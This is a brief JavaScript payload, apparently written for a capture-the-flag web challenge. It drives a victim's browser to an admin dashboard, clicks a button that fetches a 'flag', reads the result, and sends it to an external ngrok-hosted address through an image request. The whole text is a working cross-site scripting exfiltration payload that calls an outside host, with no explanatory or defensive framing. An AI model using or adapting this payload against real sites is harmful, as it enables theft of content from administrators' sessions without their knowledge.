location="/admin/dashboard";

setTimeout(()=>{
document.getElementById("fetchFlag2Btn").click();

setTimeout(()=>{
let f=document.getElementById("flag2Content");

if(f){
new Image().src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?flag="+f.innerText
}

},2000)

},3000)
